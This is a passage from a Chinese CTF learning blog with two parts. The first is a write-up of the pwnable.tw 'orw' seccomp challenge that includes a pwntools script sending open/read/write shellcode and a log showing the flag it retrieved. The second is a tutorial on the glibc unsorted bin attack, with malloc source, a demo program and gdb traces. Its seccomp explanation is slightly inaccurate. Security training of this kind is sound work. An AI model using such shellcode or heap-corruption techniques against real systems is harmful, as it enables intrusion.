//常数#define\t\tBPF_X\t\t0x08\n另外与SECCOMP有关的定义在/usr/include/linux/seccomp.h，现在来看看怎么写规则，首先是BPF_LD，它需要用到的结构为：\nstruct seccomp_data {    int   nr;                   /* System call number */    __u32 arch;                 /* AUDIT_ARCH_* value                                  (在 &lt;linux/audit.h&gt; 里) */    __u64 instruction_pointer;  /* CPU instruction pointer */    __u64 args[6];              /* Up to 6 system call arguments */};\n其中args中是6个寄存器，在32位下是：ebx,ecx,edx,esi,edi,ebp，在64位下是：rdi,rsi,rdx,r10,r8,r9，现在要将syscall时eax的值载入RegA，可以使用：\nBPF_STMT(BPF_LD+BPF_W+BPF_ABS,0)//这会把偏移0处的值放进寄存器A，读取的是seccomp_data的数据//或者BPF_STMT(BPF_LD+BPF_W+BPF_ABS,regoffset(eax))\n而跳转语句写法如下：\nBPF_JUMP(BPF_JMP+BPF_JEQ,59,1,0)               //这回把寄存器A与值k(此处为59)作比较，为真跳过下一条规则，为假不跳转\n其中后两个参数代表成功跳转到第几条规则，失败跳转到第几条规则，这是相对偏移。\n最后当验证完成需要返回结果，即是否允许：\nBPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL)\n过滤的规则列表里可以有多条规则，seccomp会从第0条开始逐条执行，直到遇到BPF_RET返回，决定是否允许该操作以及做某些修改。\n总结一下：\n\n结构赋值操作指令为：BPF_STMT、BPF_JUMP\nBPF 的主要指令有 BPF_LD，BPF_ALU，BPF_JMP，BPF_RET 等。BPF_LD 将数据装入累加器，BPF_ALU 对累加器执行算术命令，BPF_JMP 是跳转指令，BPF_RET 是程序返回指令\nBPF 条件判断跳转指令：BPF_JMP、BPF_JEQ，根据后面的几个参数进行判断，然后跳转到相应的地方。\n返回指令：BPF_RET、BPF_K，返回后面参数的值\n\n例如ByteCTF中一道堆题的sock_filter结构体如下（和此篇文章中的题目无关，仅供参考）\nstruct sock_filter filter[] = {    BPF_STMT(BPF_LD|BPF_W|BPF_ABS, 0),          // 从第0个字节位置开始，加载读取系统调用号    BPF_JUMP(BPF_JMP|BPF_JEQ, 257, 1, 0),       // 比较系统调用号是否为 257（257 是 openat 的系统调用），是就跳到第5行    BPF_JUMP(BPF_JMP|BPF_JGE, 0, 1, 0),         // 比较系统调用号是否大于 0，是就跳到第6行    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ERRNO), // 拒绝系统调用，返回 0    BPF_STMT(BPF_RET|BPF_K, SECCOMP_RET_ALLOW), // 允许系统调用};\n拿本题的sock_filter结构体说明一下：\n line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW\nline 1表示这道题需要运行在架构不为i386的机器或环境中，否则直接返回ERROR。\nline 8表示如果传入的系统调用号为read，则允许执行，否则直接结束进程。\n开始解题\n经过前面的分析我们已经知道了此题只能使用只能使用 read、write、_exit、open。\n老规矩，检查一下文件的保护机制：\nctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ checksec orww[*] '/mnt/hgfs/PWN\\xe9\\xa2\\x98/Range/pwnable.xyz/orww'    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n可以看到程序为32位，只开启了NX保护。main函数如下：\nint __cdecl main(int argc, const char **argv, const char **envp){  orw_seccomp();  printf(\"Give my your shellcode:\");  read(0, &amp;shellcode, 0xC8u);  ((void (*)(void))shellcode)();  return 0;}\n很简单，输入shellcode之后程序就会执行它。\n还有一个问题，system和execve都被禁用了怎么办？\n读取flag的方式有很多，虽然无法拿到shell，但是我们可以用open、read、write三个系统调用去读flag，flag放在了/home/orw/flag。\n同时题目已经给予了这个提示：\n因此这里考验我们直接编写shellcode的能力，这里注意\n• 对于32位程序，应调用int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。\n• 对于64位程序，应调用syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。\n由于这道题是32位程序，因此编写shellcode如下：\nfrom pwn import *context.log_level=\"debug\"p = remote('chall.pwnable.tw', 10001)shellcode_open = 'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'shellcode_read = 'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'shellcode_write = 'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'shellcode = shellcode_open + shellcode_read + shellcode_writeshellcode = asm(shellcode)p.recvuntil(':')p.sendline(shellcode)print p.recv()p.interactive()'''shellcode说明：                   xor eax,eax      ;清空需要用到的寄存器xor ebx,ebxxor ecx,ecxxor edx,edx#fd = open('/home/orw/flag',0)push 0x00006761;           ;\"/home/orw/flag\"的十六进制push 0x6c662f77;           ;\"/home/orw/flag\"的十六进制push 0x726f2f65;           ;\"/home/orw/flag\"的十六进制push 0x6d6f682f;           ;\"/home/orw/flag\"的十六进制mov ebx, esp;              ;const char __user *filenamemov eax, 0x5;              ;open函数的系统调用：sys_openint 0x80;#read(fd,bss+0x200,0x40)mov ebx, eax;              ;int fdmov ecx, 0x0804A260;       ;void *bufmov edx, 0x40;             ;size_t countmov eax, 0x3;              ;read函数的系统调用：sys_readint 0x80;#write(1,bss+0x200,0x40)mov ebx, 0x1;              ;int fd=1 (标准输出stdout)(0 标准输入，1 标准输出，2 标准错误输出)mov ecx, 0x0804A260;       ;void *bufmov edx, 0x40;             ;size_t countmov eax, 0x4;              ;read函数的系统调用：sys_readint 0x80;'''\n➜  others python orw_exp.py [+] Opening connection to chall.pwnable.tw on port 10001: Done[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2.7/site-packages/pwnlib/data/includes /dev/stdin[DEBUG] Assembling    .section .shellcode,\"awx\"    .global _start    .global __start    _start:    __start:    .intel_syntax noprefix    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-7bYAEr/step2 /tmp/pwn-asm-7bYAEr/step1[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-7bYAEr/step3 /tmp/pwn-asm-7bYAEr/step4[DEBUG] Received 0x17 bytes:    'Give my your shellcode:'[DEBUG] Sent 0x4f bytes:    00000000  31 c0 31 db  31 c9 31 d2  68 61 67 00  00 68 77 2f  │1·1·│1·1·│hag·│·hw/│    00000010  66 6c 68 65  2f 6f 72 68  2f 68 6f 6d  89 e3 b8 05  │flhe│/orh│/hom│····│    00000020  00 00 00 cd  80 89 c3 b9  60 a2 04 08  ba 40 00 00  │····│····│`···│·@··│    00000030  00 b8 03 00  00 00 cd 80  bb 01 00 00  00 b9 60 a2  │····│····│····│··`·│    00000040  04 08 ba 40  00 00 00 b8  04 00 00 00  cd 80 0a     │···@│····│····│···│    0000004f[DEBUG] Received 0x40 bytes:    00000000  46 4c 41 47  7b 73 68 33  6c 6c 63 30  64 69 6e 67  │FLAG│{sh3│llc0│ding│    00000010  5f 77 31 74  68 5f 6f 70  33 6e 5f 72  33 34 64 5f  │_w1t│h_op│3n_r│34d_│    00000020  77 72 69 74  33 7d 0a 00  00 00 00 00  00 00 00 00  │writ│3}··│····│····│    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│    00000040\t\t\tFLAG{sh3llc0ding_w1th_op3n_r34d_writ3}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00[*] Switching to interactive mode[*] Got EOF while reading in interactive$ \nprctl是否能绕过？\n可以，但是不会\n","categories":["pwn 进阶"],"tags":["orw"]},{"title":"unsorted bin","url":"/2023/09/14/unsorted%20bin%20attack/","content":"关于unsorted bin 和 unsorted bin attack\n前言\nunsorted bin attack作为一种久远的攻击方式常常作为其他攻击方式的辅助手段，比如修改global_max_fast为一个较大的值使得几乎所有大小的chunk都用fast bin的管理方式进行分配和释放，又或者修改_IO_list_all来伪造_IO_FILE进行攻击。在上述攻击的利用过程中我们实际上并不需要对unsorted bin的分配过程有太多的了解。\n\nglobal_max_fast是main_arena中控制最大fastbin大小的变量。\n\nunsotedbin 基本来源\n1、当一个较大的（在bin中的）chunk（由于malloc）被分割成两半之后，如果剩下的部分大于MINSIZE，就会被放到unsortedbin中。\n\n举个例子，如有个0x90大小的 small chunk，此时malloc(0x60)，剩下的0x30由于大于 MINSIZE ，会被放入unsortedbin 中\n\n2、释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。\n3、当进行malloc_consolidate时，如果不是和top_chunk近邻的话，可能会把合并后的chunk放到unsortedbin中。\n\nconsolidate是一个动词，其中文意思为：使加强; 使巩固; (使) 结成一体，合并;\n因此malloc_consolidate的意思是堆中的碎片整理，目的是为了减少堆中的碎片。\n\nunsortedbin_attack 概述\n● Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。\n● Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。\nunsortedbin_attack 效果\n● Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值，然后配合fastbin attack使用，达到任意地址写的效果。\nunsortedbin 源码分析\n\n这里使用libc-2.23版本的源码\n下面的源码不理解也没有关系（看看就好），这对利用unsortedbin这种攻击方式没有任何影响（）。\n最重要的是最后的总结，记住就行了。\n\n#源码的第3470行-3597行         while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))\t\t#取链表尾部的chunk记作victim        {          bck = victim-&gt;bk;          #倒数第二个chunk记作bck          #接下来对victim的size位进行检查          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, \"malloc(): memory corruption\",                             chunk2mem (victim), av);          size = chunksize (victim);\t\t  #检查通过，计算victim得到实际chunk的大小          /*             If a small request, try to use last remainder if it is the             only chunk in unsorted bin.  This helps promote locality for             runs of consecutive small requests. This is the only             exception to best-fit, and applies only when there is             no exact fit for a small chunk.           */          if (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))              #假如说我们申请的malloc大小属于smallbin的范围，并且last_remainder是              #unsortedbin的唯一一个chunk时，优先使用这个chunk。                          {              #假若满足条件则对其进行切割和解链操作                            /* split and reattach remainder */              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              if (!in_smallbin_range (remainder_size))                {                  remainder-&gt;fd_nextsize = NULL;                  remainder-&gt;bk_nextsize = NULL;                }              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }\t\t  #如果上述条件不满足，则将victim从链中取出之后放到合适的链中或返回给用户。          #其中unsorted_chunks (av)-&gt;bk = bck;          #bck-&gt;fd = unsorted_chunks (av);          #是unsorted bin attack产生的原因，          #一旦我们绕过之前的检查到达这里，          #在可以控制victim-&gt;bk即bck的情况下我们可以往bck-&gt;fd写入unsorted_chunks(av)          #即*(bck+0x10)=unsorted(av)。          /* remove from unsorted list */          #unsortedbin产生的原因：          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);\t\t  #          /* Take now instead of binning if exact fit */    \t  #如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。          if (size == nb)            {              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            }                            /* place chunk in bin */\t\t  #如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，          #需要根据其size放入small bin或large bin的链，          #其中在后者实现中存在large bin attack，          #由于同本文无关就不再进一步展开，最后是unlink将victim彻底解链。          if (in_smallbin_range (size))            {              victim_index = smallbin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;            }          else            {              victim_index = largebin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;              /* maintain large bins in sorted order */              if (fwd != bck)                {                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE;                  /* if smaller than smallest, bypass loop below */                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    {                      fwd = bck;                      bck = bck-&gt;bk;                      victim-&gt;fd_nextsize = fwd-&gt;fd;                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                    }                  else                    {                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                      while ((unsigned long) size &lt; fwd-&gt;size)                        {                          fwd = fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                        }                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)                        /* Always insert in the second position.  */                        fwd = fwd-&gt;fd;                      else                        {                          victim-&gt;fd_nextsize = fwd;                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize = victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                        }                      bck = fwd-&gt;bk;                    }                }              else                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            }          mark_bin (av, victim_index);          victim-&gt;bk = bck;          victim-&gt;fd = fwd;          fwd-&gt;bk = victim;          bck-&gt;fd = victim;#define MAX_ITERS       10000          if (++iters &gt;= MAX_ITERS)            break;        }\nunsortedbin_attack 原理\n从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置\n#glibc-2.23/malloc/malloc.c#源码第3515-3517行\t\t  /* remove from unsorted list */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);//unsorted_chunks(av)其实是&amp;main_arena.top\n换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。\nDemo\n接下来我们使用一个demo来演示unsortedbin_attack的原理：\n\n来源：https://www.yuque.com/hxfqg9/bin/tubv6q\n感谢@yichen师傅的汉化\n这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, \"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\\n\");    fprintf(stderr, \"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\\n\\n\");    unsigned long stack_var=0;    fprintf(stderr, \"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\\n\\n\", &amp;stack_var, stack_var);    unsigned long *p=malloc(0x410);    fprintf(stderr, \"一开始先申请一个比较正常的 chunk: %p\\n\",p);    fprintf(stderr, \"再分配一个避免与 top chunk 合并\\n\\n\");    malloc(500);    free(p);    fprintf(stderr, \"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\\n\",(void*)p[1]);    p[1]=(unsigned long)(&amp;stack_var-2);    fprintf(stderr, \"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\\n\");    fprintf(stderr, \"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\\n\\n\",(void*)p[1]);    malloc(0x410);    fprintf(stderr, \"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\\n\");    fprintf(stderr, \"%p: %p\\n\", &amp;stack_var, (void*)stack_var);}\n大致看一下流程，然后开始进行调试。\n\n编译命令：gcc -g demo.c -o demo\n\n开始调试\n首先对代码的第12行下断点，开始调试程序：\nubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demoGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from demo...done.pwndbg&gt; b 12Breakpoint 1 at 0x400722: file demo.c, line 12.pwndbg&gt; rStarting program: /home/ubuntu/Desktop/unsortedbin_demo/demo unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数Breakpoint 1, main () at demo.c:1212\t    unsigned long *p=malloc(0x410);LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────── RAX  0x51 RBX  0x0 RCX  0x7ffff7b04380 (__write_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x7ffff7dd3770 (_IO_stdfile_2_lock) ◂— 0x0 RDI  0x2 RSI  0x7fffffffb6e0 ◂— 0x87e5acbbe49188e6 R8   0x7ffff7fda700 ◂— 0x7ffff7fda700 R9   0x51 R10  0x0 R11  0x246 R12  0x4005b0 (_start) ◂— xor    ebp, ebp R13  0x7fffffffde70 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffdd90 —▸ 0x400870 (__libc_csu_init) ◂— push   r15 RSP  0x7fffffffdd70 —▸ 0x400870 (__libc_csu_init) ◂— push   r15 RIP  0x400722 (main+124) ◂— mov    edi, 0x410─────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────── ► 0x400722 &lt;main+124&gt;    mov    edi, 0x410   0x400727 &lt;main+129&gt;    call   malloc@plt &lt;malloc@plt&gt;    0x40072c &lt;main+134&gt;    mov    qword ptr [rbp - 0x10], rax   0x400730 &lt;main+138&gt;    mov    rax, qword ptr [rip + 0x200929] &lt;0x601060&gt;   0x400737 &lt;main+145&gt;    mov    rdx, qword ptr [rbp - 0x10]   0x40073b &lt;main+149&gt;    mov    esi, 0x400a18   0x400740 &lt;main+154&gt;    mov    rdi, rax   0x400743 &lt;main+157&gt;    mov    eax, 0   0x400748 &lt;main+162&gt;    call   fprintf@plt &lt;fprintf@plt&gt;    0x40074d &lt;main+167&gt;    mov    rax, qword ptr [rip + 0x20090c] &lt;0x601060&gt;   0x400754 &lt;main+174&gt;    mov    rcx, rax──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c    7     fprintf(stderr, \"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\\n\\n\");    8     9     unsigned long stack_var=0;   10     fprintf(stderr, \"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\\n\\n\", &amp;stack_var, stack_var);   11  ► 12     unsigned long *p=malloc(0x410);   13     fprintf(stderr, \"一开始先申请一个比较正常的 chunk: %p\\n\",p);   14     fprintf(stderr, \"再分配一个避免与 top chunk 合并\\n\\n\");   15     malloc(500);   16    17     free(p);──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────00:0000│ rsp  0x7fffffffdd70 —▸ 0x400870 (__libc_csu_init) ◂— push   r1501:0008│      0x7fffffffdd78 ◂— 0x002:0010│      0x7fffffffdd80 —▸ 0x7fffffffde70 ◂— 0x103:0018│      0x7fffffffdd88 ◂— 0xbfb16d898364180004:0020│ rbp  0x7fffffffdd90 —▸ 0x400870 (__libc_csu_init) ◂— push   r1505:0028│      0x7fffffffdd98 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax06:0030│      0x7fffffffdda0 ◂— 0x107:0038│      0x7fffffffdda8 —▸ 0x7fffffffde78 —▸ 0x7fffffffe20d ◂— '/home/ubuntu/Desktop/unsortedbin_demo/demo'────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────── ► f 0           400722 main+124   f 1     7ffff7a2d840 __libc_start_main+240─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; \n看一下这时的本地变量情况：\npwndbg&gt; info localstack_var = 0p = 0x7fffffffde70pwndbg&gt; x/5gx &amp;stack_var0x7fffffffdd78:\t0x0000000000000000\t0x00007fffffffde700x7fffffffdd88:\t0xbfb16d8983641800\t0x00000000004008700x7fffffffdd98:\t0x00007ffff7a2d840pwndbg&gt; x/5gx &amp;p0x7fffffffdd80:\t0x00007fffffffde70\t0xbfb16d89836418000x7fffffffdd90:\t0x0000000000400870\t0x00007ffff7a2d8400x7fffffffdda0:\t0x0000000000000001pwndbg&gt; \n从上面的代码框可以看到，此时：\n● stack_var的值为0，此变量的地址为0x7fffffffdd78\n● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80\n执行unsigned long *p=malloc(0x410);\n对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：\npwndbg&gt; heapAllocated chunkAddr: 0x602000Size: 0x00pwndbg&gt; top_chunkTop chunkAddr: 0x602420Size: 0x00pwndbg&gt; info localstack_var = 0p = 0x602010pwndbg&gt; x/160gx 0x6020000x602000:\t0x0000000000000000\t0x0000000000000421 #malloc_chunk10x602010:\t0x0000000000000000\t0x00000000000000000x602020:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0x602420:\t0x0000000000000000\t0x0000000000020be1 #top_chunk......（省略内容均为空）0x6024f0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/16gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602420 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b780x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88pwndbg&gt; \n执行malloc(500);\n现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：\npwndbg&gt; heapAllocated chunkAddr: 0x602000Size: 0x00pwndbg&gt; top_chunkTop chunkAddr: 0x602620Size: 0x00pwndbg&gt; x/16gx &amp;main_arena 0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602620 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b780x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88pwndbg&gt; x/300gx 0x6020000x602000:\t0x0000000000000000\t0x0000000000000421 #malloc_chunk1......（省略内容均为空）0x602420:\t0x0000000000000000\t0x0000000000000201 #malloc_chunk1......（省略内容均为空）0x602620:\t0x0000000000000000\t0x00000000000209e1 #top_chunk......（省略内容均为空）0x602950:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。\n\n释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。\n\n执行free(p)\n对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：\nunsortedbinall [corrupted]FD: 0x602000 ◂— 0x0BK: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000pwndbg&gt; x/16gx 0x6020000x602000:\t0x0000000000000000\t0x0000000000000421 #unsortedbin0x602010:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b78    \t\t#fd\t\t\t\t\t#bk0x602020:\t0x0000000000000000\t0x00000000000000000x602030:\t0x0000000000000000\t0x00000000000000000x602040:\t0x0000000000000000\t0x00000000000000000x602050:\t0x0000000000000000\t0x00000000000000000x602060:\t0x0000000000000000\t0x00000000000000000x602070:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/30gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000......(省略内容均为空)0x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602620  \t\t\t\t\t\t\t\t\t\t\t\t\t#指向top_chunk\t\t\t\t\t\t\t\t\t\t\t\t\t#unsortedbin指向的地方0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x0000000000602000     \t\t\t\t\t\t\t\t\t\t\t\t#unsortedbin0x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x0000000000602000\t0x00007ffff7dd1b880x7ffff7dd1ba0 &lt;main_arena+128&gt;:\t0x00007ffff7dd1b88\t0x00007ffff7dd1b980x7ffff7dd1bb0 &lt;main_arena+144&gt;:\t0x00007ffff7dd1b98\t0x00007ffff7dd1ba80x7ffff7dd1bc0 &lt;main_arena+160&gt;:\t0x00007ffff7dd1ba8\t0x00007ffff7dd1bb80x7ffff7dd1bd0 &lt;main_arena+176&gt;:\t0x00007ffff7dd1bb8\t0x00007ffff7dd1bc80x7ffff7dd1be0 &lt;main_arena+192&gt;:\t0x00007ffff7dd1bc8\t0x00007ffff7dd1bd80x7ffff7dd1bf0 &lt;main_arena+208&gt;:\t0x00007ffff7dd1bd8\t0x00007ffff7dd1be80x7ffff7dd1c00 &lt;main_arena+224&gt;:\t0x00007ffff7dd1be8\t0x00007ffff7dd1bf8pwndbg&gt; \n在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。\n\n执行p[1]=(unsigned long)(&amp;stack_var-2);\n对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);\npwndbg&gt; x/16gx 0x6020000x602000:\t0x0000000000000000\t0x00000000000004210x602010:\t0x00007ffff7dd1b78\t0x00007fffffffdd68    \t\t#fd\t\t\t\t\t#bk被更改0x602020:\t0x0000000000000000\t0x00000000000000000x602030:\t0x0000000000000000\t0x00000000000000000x602040:\t0x0000000000000000\t0x00000000000000000x602050:\t0x0000000000000000\t0x00000000000000000x602060:\t0x0000000000000000\t0x00000000000000000x602070:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置\npwndbg&gt; unsortedbin unsortedbinall [corrupted]FD: 0x602000 ◂— 0x0BK: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000pwndbg&gt; x/16gx 0x00007fffffffdd680x7fffffffdd68:\t0x00000000004007a8\t0x0000000000400870    \t\t\t#unsortedbin中bk指针所指向的地方0x7fffffffdd78:\t0x0000000000000000\t0x0000000000602010    